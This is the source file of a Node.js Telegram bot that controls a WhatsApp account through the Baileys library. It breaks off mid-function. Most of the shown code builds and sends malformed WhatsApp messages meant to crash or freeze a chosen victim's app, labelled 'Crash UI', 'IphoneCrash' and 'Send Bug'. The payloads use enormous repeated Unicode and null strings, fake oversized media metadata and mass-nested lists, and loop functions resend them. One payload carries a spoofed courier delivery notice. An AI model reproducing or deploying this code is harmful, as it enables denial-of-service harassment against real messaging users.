const fs = require('fs');
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const P = require('pino');
const tdxlol = fs.readFileSync('./storage/tdx.jpeg')
const global = require('./storage/config.js');
const Boom = require('@hapi/boom');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(global.botToken, { polling: true });
const owner = global.owner;
const { requestRegistrationCode } = require('@whiskeysockets/baileys');
const cooldowns = new Map();
const crypto = require("crypto");
const axios = require('axios');
console.log(`:) SUCCES CONECTION`)
let Ren;
let premiumUsers = JSON.parse(fs.readFileSync('./storage/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./storage/admin.json'));
let whatsappStatus = false;
           function getGreeting() {
                   const hours = new Date().getHours();
                   if (hours >= 0 && hours < 12) {
                           return "Selamat Pagi 🌆";
                   } else if (hours >= 12 && hours < 18) {
                           return "Selamat Sore 🌇";
                   } else {
                           return "Selamat Malam 🌌";
                   }
           }
           const greeting = getGreeting();
           async function startWhatsapp() {
                   const {
                           state,
                           saveCreds
                   } = await useMultiFileAuthState('Siro');
                   Ren = makeWASocket({
                           auth: state,
                           logger: P({
                                   level: 'silent'
                           }),
                           printQRInTerminal: false,
                   });
                   Ren.ev.on('connection.update', async (update) => {
                           const {
                                   connection,
                                   lastDisconnect
                           } = update;
                           if (connection === 'close') {
                                   const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
                                   if (reason && reason >= 500 && reason < 600 && reason === 428 && reason === 408 && reason === 429) {
                                           whatsappStatus = false;
                                           await getSessions(bot, chatId, number);
                                   } else {
                                           whatsappStatus = false;
                                   }
                           } else if (connection === 'open') {
                                   whatsappStatus = true;
                           }
                   })
           };
           async function getSessions(bot, chatId, number) {
                   const {
                           state,
                           saveCreds
                   } = await useMultiFileAuthState('Siro');
                   Ren = makeWASocket({
                           auth: state,
                           logger: P({
                                   level: 'silent'
                           }),
                           printQRInTerminal: false,
                   });
                   Ren.ev.on('connection.update', async (update) => {
                           const {
                                   connection,
                                   lastDisconnect
                           } = update;
                           if (connection === 'close') {
                                   const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
                                   if (reason && reason >= 500 && reason < 600) {
                                           whatsappStatus = false;
                                           await bot.sendMessage(chatId, `${number} ☬ 𝐖𝐀𝐈𝐓𝐈𝐍𝐆 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 ☬`);
                                           await getSessions(bot, chatId, number);
                                   } else {
                                           whatsappStatus = false;
                                           await bot.sendMessage(chatId, `${number} ☬ 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐄𝐗𝐏𝐈𝐑𝐄𝐃 ☬`);
                                           await fs.unlinkSync('./Siro/creds.json');
                                   }
                           } else if (connection === 'open') {
                                   whatsappStatus = true;
                                   bot.sendMessage(chatId, `${number} ☬ 𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐓𝐎 𝐘𝐎𝐔𝐑 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ☬`);
                           }
                           if (connection === 'connecting') {
                                   await new Promise(resolve => setTimeout(resolve, 1000));
                                   try {
                                           if (!fs.existsSync('./Siro/creds.json')) {
                                                   const formattedNumber = number.replace(/\D/g, '');
                                                   const pairingCode = await Ren.requestPairingCode(formattedNumber);
                                                   const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
                                                   bot.sendMessage(chatId, `${number} CODE : ${formattedCode}`);
                                           }
                                   } catch (error) {
                                           bot.sendMessage(chatId, `EROR CODE : ${error.message}`);
                                   }
                           }
                   });
                   Ren.ev.on('creds.update', saveCreds);
           }

           function savePremiumUsers() {
                   fs.writeFileSync('./storage/premium.json', JSON.stringify(premiumUsers, null, 2));
           }

           function saveAdminUsers() {
                   fs.writeFileSync('./storage/admin.json', JSON.stringify(adminUsers, null, 2));
           }

           function watchFile(filePath, updateCallback) {
                   fs.watch(filePath, (eventType) => {
                           if (eventType === 'change') {
                                   try {
                                           const updatedData = JSON.parse(fs.readFileSync(filePath));
                                           updateCallback(updatedData);
                                           console.log(`File ${filePath} updated successfully.`);
                                   } catch (error) {
                                           console.error(`Error updating ${filePath}:`, error.message);
                                   }
                           }
                   });
           }
           watchFile('./storage/premium.json', (data) => (premiumUsers = data));
           watchFile('./storage/admin.json', (data) => (adminUsers = data));
           async function CallPermision(target) {
                   let {
                           generateWAMessageFromContent,
                           proto
                   } = require("@whiskeysockets/baileys")
                   let sections = [];
                   for (let i = 0; i < 100000; i++) {
                           let ThunderVarious = {
                                   title: `Thunder Avalible Strom \"🐉\" ${i}`,
                                   highlight_label: `𝐊𝐚𝐢𝐝𝐞𝐧𝐀𝐦𝐚𝐭𝐞𝐫𝐚𝐬𝐮 ${i}`,
                                   rows: [{
                                           title: "𝘿𝙚𝙡𝙖𝙮 𝙈𝙖𝙠𝙚𝙧 🪐",
                                           id: `id${i}`,
                                           subrows: [{
                                                   title: "𝘿𝙚𝙡𝙖𝙮 𝙈𝙖𝙠𝙚𝙧🏷️",
                                                   id: `nested_id1_${i}`,
                                                   subsubrows: [{
                                                           title: "𝘿𝙚𝙡𝙖𝙮 𝙈𝙖𝙠𝙚𝙧 -- ©𝐊𝐚𝐢𝐝𝐞𝐧 𝐀𝐦𝐚𝐭𝐞𝐫𝐚𝐬𝐮",
                                                           id: `deep_nested_id1_${i}`,
                                                   }, {
                                                           title: "𝙄𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚 - 𝘿𝙚𝙡𝙖𝙮 𝙈𝙖𝙠𝙚𝙧🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝙄𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚 - 𝘿𝙚𝙡𝙖𝙮 𝙈𝙖𝙠𝙚𝙧🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝙄𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚 - 𝘿𝙚𝙡𝙖𝙮 𝙈𝙖𝙠𝙚𝙧🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝙄𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚 - 𝘿𝙚𝙡𝙖𝙮 𝙈𝙖𝙠𝙚𝙧🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝙄𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚 - 𝘿𝙚𝙡𝙖𝙮 𝙈𝙖𝙠𝙚𝙧🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝙄𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚 - 𝘿𝙚𝙡𝙖𝙮 𝙈𝙖𝙠𝙚𝙧🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝙄𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚 - 𝘿𝙚𝙡𝙖𝙮 𝙈𝙖𝙠𝙚𝙧🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }, {
                                                           title: "𝙄𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚 - 𝘿𝙚𝙡𝙖𝙮 𝙈𝙖𝙠𝙚𝙧🐉",
                                                           id: `deep_nested_id2_${i}`,
                                                   }],
                                           }, {
                                                   title: "Crash UI〽️",
                                                   id: `nested_id2_${i}`,
                                           }, ],
                                   }, ],
                           };
                           let ButtonOverFlow = {
                                   buttonsMessage: {
                                           documentMessage: {
                                                   url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                                                   mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                                   fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                                                   fileLength: "9999999999999",
                                                   pageCount: 3567587327,
                                                   mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                                                   fileName: "\u0000",
                                                   fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                                                   directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                                                   mediaKeyTimestamp: "1735456100",
                                                   contactVcard: true,
                                                   caption: ""
                                           },
                                           contentText: "🐉 - Kaiden Amaterasu",
                                           footerText: "© 𝐊𝐚𝐢𝐝𝐞𝐧 𝐀𝐦𝐚𝐭𝐞𝐫𝐚𝐬𝐮",
                                           buttons: [{
                                                   buttonId: `${i}`,
                                                   buttonText: {
                                                           displayText: "🐉------- C̵͉͋̔͞r̴̨̦͕̝ā̤̓̍͘s̠҉͍͊ͅḣ̖̻͛̓ U̠҉̷̙ͦI̍̅̀̎̊̍̅̀̎"
                                                   },
                                                   type: 1
                                           }],
                                           headerType: 2
                                   }
                           }
                           let TrashDex = {
                                   title: `𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉 ${i}`,
                                   highlight_label: `〽️ ${i}️`,
                                   rows: [{
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "ᨒ",
                                           id: `.allmenu ${i}`
                                   }, {
                                           header: `𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉 ${i}`,
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: `𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉 ${i}`,
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: `𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉 ${i}`,
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }, {
                                           header: "𝐂𝐫𝐚𝐬𝐡 𝐔𝐈🐉",
                                           title: "𐁘",
                                           id: `.xowner ${i}`
                                   }]
                           }
                           sections.push(ThunderVarious, TrashDex, ButtonOverFlow);
                   }
                   let listMessage = {
                           title: "𝐊𝐚𝐢𝐝𝐞𝐧 𝐀𝐦𝐚𝐭𝐞𝐫𝐚𝐬𝐮",
                           sections: sections,
                   };
                   let msg = generateWAMessageFromContent(target, {
                           viewOnceMessage: {
                                   message: {
                                           messageContextInfo: {
                                                   deviceListMetadata: {},
                                                   deviceListMetadataVersion: 2,
                                           },
                                           interactiveMessage: proto.Message.InteractiveMessage.create({
                                                   contextInfo: {
                                                           mentionedJid: [],
                                                           isForwarded: true,
                                                           forwardingScore: 999,
                                                           businessMessageForwardInfo: {
                                                                   businessOwnerJid: target,
                                                           },
                                                   },
                                                   body: proto.Message.InteractiveMessage.Body.create({
                                                           text: "\u0000",
                                                   }),
                                                   footer: proto.Message.InteractiveMessage.Footer.create({
                                                           buttonParamsJson: "JSON.stringify(listMessage)",
                                                   }),
                                                   header: proto.Message.InteractiveMessage.Header.create({
                                                           buttonParamsJson: "JSON.stringify(listMessage)",
                                                           subtitle: "Testing Immediate Force Close",
                                                           hasMediaAttachment: false,
                                                   }),
                                                   nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                                           buttons: [{
                                                                   name: "single_select",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "payment_method",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "single_select",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "JSON.stringify(listMessage)",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "call_permission_request",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }, {
                                                                   name: "mpm",
                                                                   buttonParamsJson: "{}",
                                                           }],
                                                   }),
                                           }),
                                   },
                           },
                   }, {
                           userJid: target
                   });
                   await Ren.relayMessage(target, msg.message, {
                           participant: {
                                   jid: target,
                           },
                   });
                   console.log("Send Bug By KaidenAmaterasu🐉");
           }
           async function LocationUi(target) {
                   await Ren.relayMessage(target, {
                           groupMentionedMessage: {
                                   message: {
                                           interactiveMessage: {
                                                   header: {
                                                           locationMessage: {
                                                                   degreesLatitude: 111,
                                                                   degreesLongitude: 111
                                                           },
                                                           hasMediaAttachment: true
                                                   },
                                                   body: {
                                                           text: "\u0000" + "ꦿꦸ".repeat(150000) + "@1".repeat(70000),
                                                   },
                                                   nativeFlowMessage: {
                                                           messageParamsJson: "🛒드림 -- Vyross"
                                                   },
                                                   contextInfo: {
                                                           mentionedJid: Array.from({
                                                                   length: 5
                                                           }, () => "1@newsletter"),
                                                           groupMentions: [{
                                                                   groupJid: "1@newsletter",
                                                                   groupSubject: "🛒드림 -- Vyross"
                                                           }],
                                                           quotedMessage: {
                                                                   documentMessage: {
                                                                           contactVcard: true
                                                                   }
                                                           }
                                                   }
                                           }
                                   }
                           }
                   }, {
                           participant: {
                                   jid: target
                           }
                   });
                   console.log("Send Bug By KaidenAmaterasu🐉");
           }
           async function DocumentUi(target) {
                   await Ren.relayMessage(target, {
                           groupMentionedMessage: {
                                   message: {
                                           interactiveMessage: {
                                                   header: {
                                                           documentMessage: {
                                                                   url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                                                   mimetype: "application/pdf",
                                                                   fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                                                   fileLength: "1099511627776",
                                                                   pageCount: 199183729199991,
                                                                   mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                                                   fileName: "🛒드림 || 𝑲𝒂𝒊𝒅𝒆𝒏 𝑳𝒊𝒆𝒏𝒛𝑿 - 𝑨𝒎𝒂𝒕𝒆𝒓𝒂𝒔𝒖 ✨",
                                                                   fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                                                   directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                                                   mediaKeyTimestamp: "1728631701",
                                                                   contactVcard: true
                                                           },
                                                           hasMediaAttachment: true
                                                   },
                                                   body: {
                                                           text: "\u0000" + "ꦿꦸ".repeat(1) + "@1".repeat(1),
                                                   },
                                                   nativeFlowMessage: {
                                                           messageParamsJson: "🛒드림 -- Kaiden",
                                                           "buttons": [{
                                                                   "name": "review_and_pay",
                                                                   "buttonParamsJson": "{\"currency\":\"IDR\",\"total_amount\":{\"value\":2000000,\"offset\":100},\"reference_id\":\"4R0F79457Q7\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-8e93f147-12f5-45fa-b903-6fa5777bd7de\",\"name\":\"sksksksksksksks\",\"amount\":{\"value\":2000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"sksksksksksksks\",\"native_payment_methods\":[],\"share_payment_status\":false}"
                                                           }]
                                                   },
                                                   contextInfo: {
                                                           mentionedJid: Array.from({
                                                                   length: 5
                                                           }, () => "1@newsletter"),
                                                           groupMentions: [{
                                                                   groupJid: "1@newsletter",
                                                                   groupSubject: "🛒드림 -- Kaiden"
                                                           }]
                                                   }
                                           }
                                   }
                           }
                   }, {
                           participant: {
                                   jid: target
                           }
                   });
                   console.log("Send Bug By KaidenAmaterasu🐉");
           }
           async function CrashButton(target) {
                   let IphoneCrash = "\u0000".repeat(45000)
                   const stanza = [{
                           attrs: {
                                   biz_bot: '1'
                           },
                           tag: "bot",
                   }, {
                           attrs: {},
                           tag: "biz",
                   }, ];
                   let messagePayload = {
                           viewOnceMessage: {
                                   message: {
                                           locationMessage: {
                                                   degreesLatitude: 11.11,
                                                   degreesLongitude: -11.11,
                                                   name: `Halo Mas kami dari J&T Express akan melakukan proses delivery paket COD dengan nomor waybillzz JX3272026054 ke alamat anda , SEMARANG JAWA TENGAH , mohon kesediaannya untuk memastikan apakah anda benar memesan barang COD senilai Rp 301,990？Terima kasih`,
                                                   url: "https://youtube.com/@aidilaseptia",
                                                   contextInfo: {
                                                           participant: "0@s.whatsapp.net",
                                                           remoteJid: "status@broadcast",
                                                           quotedMessage: {
                                                                   buttonsMessage: {
                                                                           documentMessage: {
                                                                                   url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                                                                                   mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                                                                   fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                                                                                   fileLength: "9999999999999",
                                                                                   pageCount: 3567587327,
                                                                                   mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                                                                                   fileName: "\u0000",
                                                                                   fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                                                                                   directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                                                                                   mediaKeyTimestamp: "1735456100",
                                                                                   contactVcard: true,
                                                                                   caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                                                                           },
                                                                           contentText: "\u0000",
                                                                           footerText: "© Kaiden Amaterasu",
                                                                           buttons: [{
                                                                                   buttonId: "\u0000".repeat(850000),
                                                                                   buttonText: {
                                                                                           displayText: "yeee"
                                                                                   },
                                                                                   type: 1
                                                                           }],
                                                                           headerType: 3
                                                                   }
                                                           },
                                                           conversionSource: "porn",
                                                           conversionData: crypto.randomBytes(16),
                                                           conversionDelaySeconds: 1,
                                                           forwardingScore: 999999,
                                                           isForwarded: true,
                                                           quotedAd: {
                                                                   advertiserName: " x ",
                                                                   mediaType: "IMAGE",
                                                                   jpegThumbnail: tdxlol,
                                                                   caption: " x "
                                                           },
                                                           placeholderKey: {
                                                                   remoteJid: "0@s.whatsapp.net",
                                                                   fromMe: false,
                                                                   id: "ABCDEF1234567890"
                                                           },
                                                           expiration: -99999,
                                                           ephemeralSettingTimestamp: Date.now(),
                                                           ephemeralSharedSecret: crypto.randomBytes(16),
                                                           entryPointConversionSource: "kontols",
                                                           entryPointConversionApp: "kontols",
                                                           actionLink: {
                                                                   url: "t.me/pxbian",
                                                                   buttonTitle: "konstol"
                                                           },
                                                           disappearingMode: {
                                                                   initiator: 1,
                                                                   trigger: 2,
                                                                   initiatorDeviceJid: target,
                                                                   initiatedByMe: true
                                                           },
                                                           groupSubject: "kontol",
                                                           parentGroupJid: "kontolll",
                                                           trustBannerType: "kontol",
                                                           trustBannerAction: 99999,
                                                           isSampled: true,
                                                           externalAdReply: {
                                                                   title: "\u0000",
                                                                   mediaType: 2,
                                                                   renderLargerThumbnail: true,
                                                                   showAdAttribution: true,
                                                                   containsAutoReply: true,
                                                                   body: "Kaiden Amaterasu",
                                                                   thumbnailUrl: "https://c.top4top.io/p_3370ccxo01.jpg",
                                                                   sourceUrl: "go fuck yourself",
                                                                   sourceId: "dvx - problem",
                                                                   ctwaClid: "cta",
                                                                   ref: "ref",
                                                                   clickToWhatsappCall: true,
                                                                   automatedGreetingMessageShown: false,
                                                                   greetingMessageBody: "kontol",
                                                                   ctaPayload: "cta",
                                                                   disableNudge: true,
                                                                   originalImageUrl: "konstol"
                                                           },
                                                           featureEligibilities: {
                                                                   cannotBeReactedTo: true,
                                                                   cannotBeRanked: true,
                                                                   canRequestFeedback: true
                                                           },
                                                           forwardedNewsletterMessageInfo: {
                                                                   newsletterJid: "120363274419384848@newsletter",
                                                                   serverMessageId: 1,
                                                                   newsletterName: "ꦿꦸ".repeat(10),
                                                                   contentType: 3,
                                                                   accessibilityText: "kontol"
                                                           },
                                                           statusAttributionType: 2,
                                                           utm: {
                                                                   utmSource: "utm",
                                                                   utmCampaign: "utm2"
                                                           }
                                                   },
                                                   description: "\u0000"
                                           },
                                           messageContextInfo: {
                                                   messageSecret: crypto.randomBytes(32),
                                                   supportPayload: JSON.stringify({
                                                           version: 2,
                                                           is_ai_message: false,
                                                           should_show_system_message: false,
                                                           should_upload_client_logs: false,
                                                           ticket_id: crypto.randomBytes(16),
                                                   }),
                                           },
                                   }
                           }
                   }
                   await Ren.relayMessage(target, messagePayload, {
                           participant: {
                                   jid: target
                           }
                   });
                   console.log("Send Bug By KaidenAmaterasu🐉");
           }
           async function IpLocation(target) {
                   try {
                           const IphoneCrash = "𑇂𑆵𑆴𑆿".repeat(60000);
                           await Ren.relayMessage(target, {
                                   locationMessage: {
                                           degreesLatitude: 11.11,
                                           degreesLongitude: -11.11,
                                           name: "\u0000               " + IphoneCrash,
                                           url: "https://youtube.com/@aidilaseptia"
                                   }
                           }, {
                                   participant: {
                                           jid: target
                                   }
                           });
                           console.log("Send Bug By KaidenAmaterasu🐉");
                   } catch (error) {
                           console.error("ERROR SENDING IPHONE CRASH KAIDEN:", error);
                   }
           }
           async function callxbutton(target) {
                   for (let i = 0; i < 5; i++) {
                           await CallPermision(target)
                           await CallPermision(target)
                   }
                   for (let i = 0; i < 5; i++) {
                           await CrashButton(target)
                           await CrashButton(target)
                   }
           }
           async function crashuixcursor(target) {
                   for (let i = 0; i < 5; i++) {
                           await DocumentUi(target)
                           await LocationUi(target)
                   }
                   for (let i = 0; i < 5; i++) {
                           await CrashButton(target)
                           await CrashButton(target)
                   }
           }
           async function invisiphone(target) {
                   for (let i = 0; i < 1; i++) {
                           await IpLocation(target)
                           await IpLocation(target)
                   }
           }
           async function laghomeiphone(target) {
